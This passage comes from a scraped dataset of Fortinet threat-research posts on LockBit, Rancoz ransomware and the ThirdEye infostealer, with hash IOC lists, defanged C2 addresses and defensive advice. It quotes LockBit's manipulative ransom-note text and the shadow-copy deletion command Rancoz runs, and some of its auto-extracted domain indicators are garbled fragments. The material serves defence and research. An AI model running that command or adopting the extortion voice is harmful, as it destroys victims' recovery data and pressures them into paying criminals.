or any other violations, so you have to close your firm. According to statistics, two thirds of small and medium-sized companies close within half a year after a data breach. You will have to find and fix the vulnerabilities in your network, work with the customers affected by data leaks. All of these are very costly procedures that can exceed the cost of a ransomware buyout by a factor of hundreds. It’s much easier, cheaper and faster to pay us the ransom. Well and most importantly, you will suffer a reputational loss, you have been building your company for many years, and now your reputation will be destroyed. Read more about the GDRP legislation:hxxps://en.wikipedia[.]org/wiki/General_Data_Protection_Regulationhxxps://gdpr[.]eu/what-is-gdpr/hxxps://gdpr-info[.]eu/ >>>>> Don’t go to recovery companies, they are essentially just middlemen who will make money off you and cheat you. We are well aware of cases where recovery companies tell you that the ransom price is 5 million dollars, but in fact they secretly negotiate with us for 1 million dollars, so they earn 4 million dollars from you. If you approached us directly without intermediaries you would pay 5 times less, that is 1 million dollars. >>>> Very important! For those who have cyber insurance against ransomware attacks. Insurance companies require you to keep your insurance information secret, this is to never pay the maximum amount specified in the contract or to pay nothing at all, disrupting negotiations. The insurance company will try to derail negotiations in any way they can so that they can later argue that you will be denied coverage because your insurance does not cover the ransom amount. For example your company is insured for 10 million dollars, while negotiating with your insurance agent about the ransom he will offer us the lowest possible amount, for example 100 thousand dollars, we will refuse the paltry amount and ask for example the amount of 15 million dollars, the insurance agent will never offer us the top threshold of your insurance of 10 million dollars. He will do anything to derail negotiations and refuse to pay us out completely and leave you alone with your problem. If you told us anonymously that your company was insured for $10 million and other important details regarding insurance coverage, we would not demand more than $10 million in correspondence with the insurance agent. That way you would have avoided a leak and decrypted your Information. But since the sneaky insurance agent purposely negotiates so as not to pay for the insurance claim, only the insurance company wins in this situation. To avoid all this and get the money on the insurance, be sure to inform us anonymously about the availability and terms of insurance coverage, it benefits both you and us, but it does not benefit the insurance company. Poor multimillionaire insurers will not starve and will not become poorer from the payment of the maximum amount specified in the contract, because everyone knows that the contract is more expensive than money, so let them fulfill the conditions prescribed in your insurance contract, thanks to our interaction. In April 2023, samples of LockBit for MacOS were submitted to a public file scanning service. Now that LockBit covers all major platforms (Windows, Linux, ESXi, and MacOS), LockBit developers look to stay one step ahead of competitors and further expand their influence. Evidence that they plan to take their efforts further was uncovered in late 2022 when a post offering to purchase the Raccoon Stealer source code was discovered. This addition to their arsenal would enable them to integrate known infostealer code into the LockBit ransomware. LockBit's initial access vectors include exploiting vulnerabilities and exposed Remote Access Protocol (RDP), drive-by compromise, and the use of phishing and spear-phishing emails. The LockBit group is also known to purchase existing access to targeted organizations from initial access brokers on the dark web. According to the CISA advisory, the LockBit ransomware group is reportedly exploiting the following N-day vulnerabilities: Please note that there are patches available for all of these security vulnerabilities. After LockBit affiliates gain access to victim environments, the attackers move laterally across compromised networks and exfiltrate information using various custom and dual-use tools, such as Stealbit and rclone, living-off-the-land tactics, and publicly available file-sharing services. LockBit has a data leak site on TOR where LockBit affiliates can post information about victims and their stolen data. Each victim has their own page with a countdown timer and examples of stolen information. In some cases, LockBit threat actors offer to extend the ransom deadline, download stolen information, and destroy all copies for a fee. The LockBit group also offers a file-sharing service that supports files up to 2GB. The service also has options to automatically remove uploaded files after 24 hours, seven days, or on the first download, as well as a password setting. A data leak page with search functionality is also available. The LockBit leak site was initially not as sophisticated as it is today—proof that the LockBit developer has put much effort into improving the site along with improvements to the ransomware code over the years. The below figure of the LockBit Data Leak site is courtesty ofid-ransomware. The LockBit Group has worked hard to improve its services to those who work with them. These efforts have enabled LockBit to remain at the forefront of the ransomware realm in terms of popularity and prevalence. Note that many LockBit ransomware samples exist due to the high prevalence of the ransomware over several years. Because of this, this section only contains up to 10 samples from each LockBit generation. 13849c0c923bfed5ab37224d59e2d12e3e72f97dc7f539136ae09484cbe8e5e0 ABCD ransomware 49c0acf512146620dd26f515804324c8e4b4cc8eb8b9ab5d9c57e201241bc7ae ABCD ransomware 4d0113884f70ddbbaf1ee0365602124ba91c11a76ff7bff5908d310aa9d3dfe9 ABCD ransomware 6fedf83e76d76c59c8ad0da4c5af28f23a12119779f793fd253231b5e3b00a1a ABCD ransomware 70cb1a8cb4259b72b704e81349c2ad5ac60cd1254a810ef68757f8c9409e3ea6 ABCD ransomware 9595abf24d1fa80a476c2711cd788820e9f75da015c2c8726a0a44bca0444ddf ABCD ransomware b02d57f1c4f7f233044a56fdc57c89b6cc3661479dccc3b4cfa1f6f9d20cd893 ABCD ransomware c8205792fbc0a5efc6b8f0f2257514990bfaa987768c4839d413dd10721e8871 ABCD ransomware cff048ed06cf900170562906bded4a8fd166185a1b785f5ece0e2a842cf52d46 ABCD ransomware ec88f821d22e5553afb94b4834f91ecdedeb27d9ebfd882a7d8f33b5f12ac38d ABCD ransomware 0a937d4fe8aa6cb947b95841c490d73e452a3cafcd92645afc353006786aba76 LockBit ransomware 0e66029132a885143b87b1e49e32663a52737bbff4ab96186e9e5e829aa2915f LockBit ransomware 0f178bc093b6b9d25924a85d9a7dde64592215599733e83e3bbc6df219564335 LockBit ransomware 0f5d71496ab540c3395cfc024778a7ac5c6b5418f165cc753ea2b2befbd42d51 LockBit ransomware 15a7d528587ffc860f038bb5be5e90b79060fbba5948766d9f8aa46381ccde8a LockBit ransomware 286bffaa9c81abfb938fe65be198770c38115cdec95865a241f913769e9bfd3f LockBit ransomware 410c884d883ebe2172507b5eadd10bc8a2ae2564ba0d33b1e84e5f3c22bd3677 LockBit ransomware 76a77def28acf51b2b7cdcbfaa182fe5726dd3f9e891682a4efc3226640b9c78 LockBit ransomware e3f236e4aeb73f8f8f0caebe46f53abbb2f71fa4b266a34ab50e01933709e877 LockBit ransomware faa3453ceb1bd4e5b0b10171eaa908e56e7275173178010fcc323fdea67a6869 LockBit ransomware 3f8ab65e3733ca62001500f7fcb83057869c869345affa4701fbd4d7207e6899 LockBit 2.0 4b09da2f1d94bc0fd2fd8be7b723172349e03e71117dfe483da06ac207f3e124 LockBit 2.0 5b5f3fc7bd943bd6bb575406018bf6401c6e6956ed92d54f634ba754e993d2d2 LockBit 2.0 897b23cc1af331a972da64e298163fbe0f1fd4d6bd983d452a889c1d285a1a27 LockBit 2.0 f35ba7686462a868a90bb8d9567e42e34064f91f54aeb5ed74b0d0b0e19badac LockBit 2.0 059399f01e9bd588b42dbaf61c7a3b5aa6a48ba15a3ed13bdca7ce13a71a8526 LockBit 2.0 161c951e6d2e8d07571fc451a28a9feafb672c1f05586768f8178f33a9d74efb LockBit 2.0 329e77a8a304e38ce4c4ed8906f9a7594377a3da64505fd1935b58acfc9ab4b9 LockBit 2.0 c6d3ff77910e991c6d782a3961c58ef69643c7d000b9c2d31e19904f2020dc6c LockBit 2.0 ef870afba5951592f7d2964613a7819b9c92c7c6f6bd5c6fd2aa46978deaca34 LockBit 2.0 6aee637b88a06f7cc4813b47719717a64e39047f33617930a6cd11fc25fbca0a LockBit 3.0 7d7357e4963c7d6f087a11e22d683cacf614dc7f269c2907bbb12ae30f2b007d LockBit 3.0 97320395d90b28ad3d5cd0ed0416b0fe379cc0cc3d65f0b27e50db4da5902ec2 LockBit 3.0 cb537a122fb0531f14c76dfd0a87cc304c26a9ab01aec46a5fd17f268ac80854 LockBit 3.0 f1ecb57988caf26216683b1314607f06f8bf051632ff7ba73f17c2dc9b3aafcc LockBit 3.0 072d0633006eeafc77c0b0144fdac84a57fa1e4f8b96d9aa33d377bd789bc533 LockBit 3.0 12b6fead37cca9d8ca4c00c2a9d56c0a402e760ab309356f078587acb7f33396 LockBit 3.0 58729cd09a74e3f69d26653b71412f9c9285ffaba52a9beb5b6d634014c98e1a LockBit 3.0 aa0d0c6dcb69623ac4cfd87ecd991d8fe55807cec6628b92ba698844a24ba58e LockBit 3.0 f02cf38d417fc6e3d5f9fc05ebf49ca37e6106ffc62ce21145888338598e0c70 LockBit 3.0 102679330f1e2cbf41885935ceeb2ab6596dae82925deec1aff3d90277ef6c8c LockBit Green 32eb4b7a4d612fac62e93003811e88fbc01b64281942c25f2af2a0c63cdbe7fa LockBit Green 5c5c5b25b51450a050f4b91cd2705c8242b0cfc1a0eaeb4149354dbb07979b83 LockBit Green 7509761560866a2f7496eb113954ae221f31bc908ffcbacad52b61346880d9f3 LockBit Green 924ec909e74a1d973d607e3ba1105a17e4337bd9a1c59ed5f9d3b4c25478fe11 LockBit Green ac49a9ecd0932faea3659d34818a8ed4c48f40967c2f0988eeda7eb089ad93ca LockBit Green fc8668f6097560f79cea17cd60b868db581e51644b84f5ad71ba85c00f956225 LockBit Green ffa0420c10f3d0ffd92db0091304f6ed60a267f747f4420191b5bfe7f4a513a9 LockBit Green 472836ed669d3927d50055e801048696375b37fce03b2f046e3e1039fb88e048 LockBit for Linux dc3d08480f5e18062a0643f9c4319e5c3f55a2e7e93cd8eddd5e0c02634df7cf LockBit for Linux 052716d193fc11c2f0deb67e35e580db335368d53cdd486f9cb1598c7021be8e LockBit for Linux 2f31962c5e89917f6df87babd836840042b7ea7ea01763cff1bf645878a2ab47 LockBit for Linux 719e1e9289c78ed9ee5000bffdd26bc2a4473f966091e321919e333d81e8b1e6 LockBit for Linux 624188b7b839afe83d2cc6593448b73e94c40085671f967846ac3901c9f75249 LockBit for Linux 6a6c3a6eec55a1ec47badd05d6cfe6b4f8680c7f7bc6ee571c330a5b1ffdbc3a LockBit for Linux a0b36376ab6c54540d10e5d549049622096d121abec6f760e0452a535c1675f3 LockBit for Linux 3e4bbd21756ae30c24ff7d6942656be024139f8180b7bddd4e5c62a9dfbd8c79 LockBit for MacOS 0be6f1e927f973df35dad6fc661048236d46879ad59f824233d757ec6e722bde LockBit for MacOS FortiGuard Labs has the following AV signatures in place for the LockBit samples in the IOC section: Additionally, the following AV signatures are available for LockBit samples: FortiGuard Labs has put the following IPS signatures in place for the vulnerabilities reportedly exploited by LockBit ransomware threat actors: Note: For more information on CVE-2018-13379, see the blog “Prioritizing Patching is Essential for Network Integrity.” Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is generally delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations also need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Organizations are encouraged to implement cloud-based security solutions, such asSASE, to protect off-network devices, advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack, andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context. These solutions are proven to minimize risk and reduce the impact of a successful ransomware attack. By operating these solutions as part of the industry's only fully integratedSecurity Fabric, organizations can also take advantage of native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings that can be deployed independently or as part of the Fortinet Security Fabric. These services are powered by advanced AI-enabled technologies and our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/lockbit-most-prevalent-ransomware",
      "scraped_at": "2025-07-20T13:55:27.941516",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ww",
          "estore-my-files",
          "nion",
          "estore-My-Files",
          "n"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "dc3d08480f5e18062a0643f9c4319e5c3f55a2e7e93cd8eddd5e0c02634df7cf",
          "76a77def28acf51b2b7cdcbfaa182fe5726dd3f9e891682a4efc3226640b9c78",
          "4b09da2f1d94bc0fd2fd8be7b723172349e03e71117dfe483da06ac207f3e124",
          "052716d193fc11c2f0deb67e35e580db335368d53cdd486f9cb1598c7021be8e",
          "13849c0c923bfed5ab37224d59e2d12e3e72f97dc7f539136ae09484cbe8e5e0",
          "f1ecb57988caf26216683b1314607f06f8bf051632ff7ba73f17c2dc9b3aafcc",
          "897b23cc1af331a972da64e298163fbe0f1fd4d6bd983d452a889c1d285a1a27",
          "ffa0420c10f3d0ffd92db0091304f6ed60a267f747f4420191b5bfe7f4a513a9",
          "4d0113884f70ddbbaf1ee0365602124ba91c11a76ff7bff5908d310aa9d3dfe9",
          "3f8ab65e3733ca62001500f7fcb83057869c869345affa4701fbd4d7207e6899",
          "0f5d71496ab540c3395cfc024778a7ac5c6b5418f165cc753ea2b2befbd42d51",
          "924ec909e74a1d973d607e3ba1105a17e4337bd9a1c59ed5f9d3b4c25478fe11",
          "7d7357e4963c7d6f087a11e22d683cacf614dc7f269c2907bbb12ae30f2b007d",
          "0e66029132a885143b87b1e49e32663a52737bbff4ab96186e9e5e829aa2915f",
          "faa3453ceb1bd4e5b0b10171eaa908e56e7275173178010fcc323fdea67a6869",
          "ac49a9ecd0932faea3659d34818a8ed4c48f40967c2f0988eeda7eb089ad93ca",
          "5b5f3fc7bd943bd6bb575406018bf6401c6e6956ed92d54f634ba754e993d2d2",
          "102679330f1e2cbf41885935ceeb2ab6596dae82925deec1aff3d90277ef6c8c",
          "472836ed669d3927d50055e801048696375b37fce03b2f046e3e1039fb88e048",
          "f02cf38d417fc6e3d5f9fc05ebf49ca37e6106ffc62ce21145888338598e0c70",
          "410c884d883ebe2172507b5eadd10bc8a2ae2564ba0d33b1e84e5f3c22bd3677",
          "aa0d0c6dcb69623ac4cfd87ecd991d8fe55807cec6628b92ba698844a24ba58e",
          "161c951e6d2e8d07571fc451a28a9feafb672c1f05586768f8178f33a9d74efb",
          "6fedf83e76d76c59c8ad0da4c5af28f23a12119779f793fd253231b5e3b00a1a",
          "6aee637b88a06f7cc4813b47719717a64e39047f33617930a6cd11fc25fbca0a",
          "e3f236e4aeb73f8f8f0caebe46f53abbb2f71fa4b266a34ab50e01933709e877",
          "49c0acf512146620dd26f515804324c8e4b4cc8eb8b9ab5d9c57e201241bc7ae",
          "059399f01e9bd588b42dbaf61c7a3b5aa6a48ba15a3ed13bdca7ce13a71a8526",
          "58729cd09a74e3f69d26653b71412f9c9285ffaba52a9beb5b6d634014c98e1a",
          "9595abf24d1fa80a476c2711cd788820e9f75da015c2c8726a0a44bca0444ddf",
          "0a937d4fe8aa6cb947b95841c490d73e452a3cafcd92645afc353006786aba76",
          "0f178bc093b6b9d25924a85d9a7dde64592215599733e83e3bbc6df219564335",
          "b02d57f1c4f7f233044a56fdc57c89b6cc3661479dccc3b4cfa1f6f9d20cd893",
          "ec88f821d22e5553afb94b4834f91ecdedeb27d9ebfd882a7d8f33b5f12ac38d",
          "15a7d528587ffc860f038bb5be5e90b79060fbba5948766d9f8aa46381ccde8a",
          "f35ba7686462a868a90bb8d9567e42e34064f91f54aeb5ed74b0d0b0e19badac",
          "c6d3ff77910e991c6d782a3961c58ef69643c7d000b9c2d31e19904f2020dc6c",
          "97320395d90b28ad3d5cd0ed0416b0fe379cc0cc3d65f0b27e50db4da5902ec2",
          "072d0633006eeafc77c0b0144fdac84a57fa1e4f8b96d9aa33d377bd789bc533",
          "cb537a122fb0531f14c76dfd0a87cc304c26a9ab01aec46a5fd17f268ac80854",
          "7509761560866a2f7496eb113954ae221f31bc908ffcbacad52b61346880d9f3",
          "cff048ed06cf900170562906bded4a8fd166185a1b785f5ece0e2a842cf52d46",
          "12b6fead37cca9d8ca4c00c2a9d56c0a402e760ab309356f078587acb7f33396",
          "0be6f1e927f973df35dad6fc661048236d46879ad59f824233d757ec6e722bde",
          "70cb1a8cb4259b72b704e81349c2ad5ac60cd1254a810ef68757f8c9409e3ea6",
          "32eb4b7a4d612fac62e93003811e88fbc01b64281942c25f2af2a0c63cdbe7fa",
          "ef870afba5951592f7d2964613a7819b9c92c7c6f6bd5c6fd2aa46978deaca34",
          "5c5c5b25b51450a050f4b91cd2705c8242b0cfc1a0eaeb4149354dbb07979b83",
          "a0b36376ab6c54540d10e5d549049622096d121abec6f760e0452a535c1675f3",
          "c8205792fbc0a5efc6b8f0f2257514990bfaa987768c4839d413dd10721e8871",
          "2f31962c5e89917f6df87babd836840042b7ea7ea01763cff1bf645878a2ab47",
          "fc8668f6097560f79cea17cd60b868db581e51644b84f5ad71ba85c00f956225",
          "286bffaa9c81abfb938fe65be198770c38115cdec95865a241f913769e9bfd3f",
          "624188b7b839afe83d2cc6593448b73e94c40085671f967846ac3901c9f75249",
          "329e77a8a304e38ce4c4ed8906f9a7594377a3da64505fd1935b58acfc9ab4b9",
          "3e4bbd21756ae30c24ff7d6942656be024139f8180b7bddd4e5c62a9dfbd8c79",
          "719e1e9289c78ed9ee5000bffdd26bc2a4473f966091e321919e333d81e8b1e6",
          "6a6c3a6eec55a1ec47badd05d6cfe6b4f8680c7f7bc6ee571c330a5b1ffdbc3a"
        ],
        "cve": [
          "CVE-2018-13379"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.6681092777928049
    }
  },
  {
    "id": "Fortinet_93145",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Rancoz",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Rancoz ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High It's only been a few months since the Rancoz ransomware first came to the public's attention. However, it's important to raise awareness of this ransomware variant, as the most recent victim on their data leak site on TOR dates back just a few weeks to mid-June. The first recorded Rancoz victim, according to their TOR site, occurred in November of 2022. The Rancoz modus operandi is similar to other groups, which is to encrypt files on compromised machines, steal information, and extort money from victims. Information on the infection vector used by the Rancoz ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. At the time of this research, there is no indication that Rancoz is widespread. Once executed, Rancoz ransomware enumerates all local drives and encrypts files unless the attackers specify otherwise. It adds a “.rec_rans” extension to the files it encrypts and leaves a ransom note labeled “HOW_TO_RECOVERY_FILES.txt” [sic]. Furthermore, the ransomware deletes shadow copies by running the command “/c vssadmin.exe Delete Shadows /All /Quiet”, which makes file recovery difficult. It then deletes the registry “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\\” while resetting the registry “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\\”. Removal of those registry keys may prevent victims from being able to connect to remote servers for file recovery. The ransom note contains the URL of the Rancoz data leak site and the attacker’s contact email address. The ransomware also replaces the desktop wallpaper, prompting victims to read the ransom note. At the time of our investigation, the Rancoz ransomware group had three victims in different industries listed on their date leak site. Two victims are in the U. S., and the other is in Canada. As seen in the below screenshot, the threat actor stole a significant amount of information and exposed that data to the public. Note that some ransomware groups remove company listings from data leak sites after the ransom is paid. Therefore, it is possible that there may be additional victims of the Rancoz ransomware. While submission locations are not a strong indicator of infection, the Rancoz ransomware samples have been submitted to a public file scanning service from the United States, India, France, and Lithuania. What's more interesting is that these submissions were made from early May to late June, which may indicate that the threat actor is still distributing the same Rancoz ransomware sample. Based on the Rancoz samples, FortiGuard Labs has determined that the Buddy ransomware (SHA2: d5e632836622d52c91e4ef059e9124184fceaf85783278880797f788ce141588) may be related to the same attacker or malware developer. Both samples were compiled on the same date and time, “2023-02-19 09:01:20 UTC”. And while this ransomware variant adds a different file extension, \".buddyransome\", to the files it encrypts, it drops a ransom note with the same name (and grammatical error) as the Rancoz ransomware. d5e632836622d52c91e4ef059e9124184fceaf85783278880797f788ce141588 also replaces the desktop wallpaper, like the Rancoz ransomware. And while the contents are different, the opening sentence is the same. We also located another ransomware sample (SHA2: da0332ace0a9ccdc43de66556adb98947e64ebdf8b3289e2291016215d8c5b4c) that may be related to the same attacker. The ransomware dropped by this sample is very similar to that of Rancoz. One significant difference is that the Rancoz ransom note links to a TOR site while the other does not. They also use different contact email addresses. However, the notes are very similar, and it also replaces the desktop wallpaper like Ramcoz and Buddy ransomware. These similarities aren't too surprising. Many ransomware variants are built on top of existing ransomware code. Recent reports indicate several custom variants based on Vice Society ransomware have also been discovered in the field. This trend, combined with common compilation dates and other similarities, supports our theory that the same developer likely created Rancoz and the other ransomware variants covered in this blog. Fortinet customers are already protected from this malware variant through AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Rancoz ransomware variants with the following AV signatures: The other ransomware covered in this blog are also detected as W64/Generik. BPRI!tr.ransom. The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. b95a4443bb8bff80d927ac551a9a5a5cfac3e3e03a5b5737c0e05c75f33ad61e Rancoz ransomware d5e632836622d52c91e4ef059e9124184fceaf85783278880797f788ce141588 Buddy ransomware da0332ace0a9ccdc43de66556adb98947e64ebdf8b3289e2291016215d8c5b4c Ransomware that resembles the Rancoz Ransomware Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. ransomware,Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-rancoz",
      "scraped_at": "2025-07-20T13:55:34.995980",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ssadmin",
          "r"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "b95a4443bb8bff80d927ac551a9a5a5cfac3e3e03a5b5737c0e05c75f33ad61e",
          "d5e632836622d52c91e4ef059e9124184fceaf85783278880797f788ce141588",
          "da0332ace0a9ccdc43de66556adb98947e64ebdf8b3289e2291016215d8c5b4c"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6004803843074461
    }
  },
  {
    "id": "Fortinet_14906",
    "source": "Fortinet",
    "title": "New Fast-Developing ThirdEye Infostealer Pries Open System Information",
    "text": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Windows UsersImpact:The information collected can be used for future attacksSeverity level:Medium FortiGuard Labs recently came across files that look suspicious, even during a cursory review. Our subsequent investigation confirmed that the files are malicious and revealed there is more to them than meets the eye: they are a previously unseen infostealer we have named “ThirdEye”. While this malware is not considered sophisticated, it’s designed to steal various information from compromised machines that can be used as stepping-stones for future attacks. This blog post analyzes the behavior and evolution of this new infostealer. Our investigation began when we spotted an archive file with a file name in Russian, “Табель учета рабочего времени.zip” (“time sheet” in English). This zip file contains two files our experience immediately identified as up to no good. Both files have a .exe extension preceded by another document-related extension (double extension). And one of the files is “CMK Правила оформления больничных листов.pdf.exe” (“QMS Rules for issuing sick leave” in English, which is an executable instead of a document, as the title suggests). The file has a SHA2 hash value of f6e6d44137cb5fcee20bcde0a162768dadbb84a09cc680732d9e23ccd2e79494. The ThirdEye infostealer has relatively simple functionality. It harvests various system information from compromised machines, such as BIOS and hardware data. It also enumerates files and folders, running processes, and network information. Once the malware is executed, it gathers all this data and sends it to its command-and-control (C2) server hosted at (hxxp://shlalala[.]ru/general/ch3ckState). And unlike most other malware, it does nothing else. One interesting string unique to the ThirdEye infostealer family (from which we derived its name) is \"3rd_eye\", which it decrypts and uses with another hash value to identify itself to the C2. The second item in the archive is “Табель учета рабочего времени.xls.exe”, which shares the same file name with the parent file. This file is a ThirdEye infostealer variant designed to perform the same activities as f6e6d44137cb5fcee20bcde0a162768dadbb84a09cc680732d9e23ccd2e79494. Based on the traits we saw in those ThirdEye infostealer samples, we managed to trace the very first sample to 610aff11acce8398f2b35e3742cb46c6a168a781c23a816de2aca471492161b2, which was first submitted to a public file scanning service on April 4th, 2023. Our analysis of that oldest sample uncovered that it did not harvest as much information as recent samples. The earliest sample we found has a compilation timestamp of Mon Apr 03 12:36:37 2023 GMT and collects the following data: It calculates a “client_hash”, which is used as an identifier. During exfiltration, the collected data is sent to the C2 server with a custom web request header: Cookie: 3rd_eye=[client_hash value] This variant uses hxxp://glovatickets[.]ru/ch3ckState as a C2 server. No significant changes were made to the malware family until a few weeks later. A variant (SHA256: A9D98B15C94BB310CDB61440FA2B11D0C7B4AA113702035156CE23F6B6C5EECF) with a compile timestamp of Wed Apr 26 09:56:55 2023 GMT collected additional data, such as: However, this version would crash in certain virtual machines due to missing hardware information. An updated variant was released one day later (SHA256: C36C4A09BCCDEDA263A33BC87A166DFBAD78C86B0F953FCD57E8CA42752AF2FC). The only change here was the use of a PDF icon. Prior to this, none of the samples we found used a custom/fake icon. “hxxp://ohmycars[.]ru/general/ch3ckState” was used as the C2 by this variant. The following week brought even more changes. This next variant (SHA256: 847CBE9457B001FAF3C09FDE89EF95F9CA9E1F79C29091C4B5B08C5F5FE48337) gathered much more data: While another variant (5D211C47612B98426DD3C8EAC092AC5CE0527BDA09AFA34B9D0F628109E0C796), compiled on Thu May 25 11:02:54 2023 GMT, gathered the same type of data, the main difference was with encoding. Instead of plaintext, the data it collected was encoded in hex. Over the past couple of months, we also spotted some variants that used internal IP addresses 10[.]10[.]30[.]36 in SHA256: 2008BDD98D3DCB6633357B8D641C97812DF916300222FC815066978090FA078F and 192[.]168[.]21[.]182 in SHA256: 847CBE9457B001FAF3C09FDE89EF95F9CA9E1F79C29091C4B5B08C5F5FE48337) instead of an actual C2 server. This was perhaps due to testing new features and/or checking for AV detections. Although there is no concrete evidence that ThirdEye infostealer was used in attacks, the malware is designed to collect information from compromised machines that is valuable for understanding and narrowing down potential targets. We believe this infostealer was designed for that purpose, and ThirdEye victims may be the subjects of future cyberattacks. Since most ThirdEye variants were submitted to a public scanning service from Russia, and the latest variant has a file name in Russian, the attacker may be looking to deploy malware to Russian-speaking organizations. While ThirdEye is not yet considered sophisticated, our investigation found the attacker has put effort into improving the infostealer, such as recent samples collecting more system information compared to older variants. We expect that effort to continue. Fortinet customers are already protected from these APT and cyber-crime campaigns through FortiGuard’s AntiVirus, FortiMail, and FortiClient services, as follows: The following (AV) signatures detect the malicious documents mentioned in this blog: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Fortinet Webfiltering blocks all ThirdEye C2s identified in this blog. If you believe this or any other cybersecurity threat has impacted your organization, please contactourGlobal FortiGuard Incident Response Team. 9db721fa9ea9cdec98f113b81429db29ea47fb981795694d88959d8a9f1042e6 Archive file containing ThirdEye Infostealer 5d211c47612b98426dd3c8eac092ac5ce0527bda09afa34b9d0f628109e0c796 ThirdEye Infostealer f6e6d44137cb5fcee20bcde0a162768dadbb84a09cc680732d9e23ccd2e79494 ThirdEye Infostealer 3d9aff07e4cb6c943aec7fcd2d845d21d0261f6f8ae1c94aee4abdf4eef5924d ThirdEye Infostealer 2008bdd98d3dcb6633357b8d641c97812df916300222fc815066978090fa078f 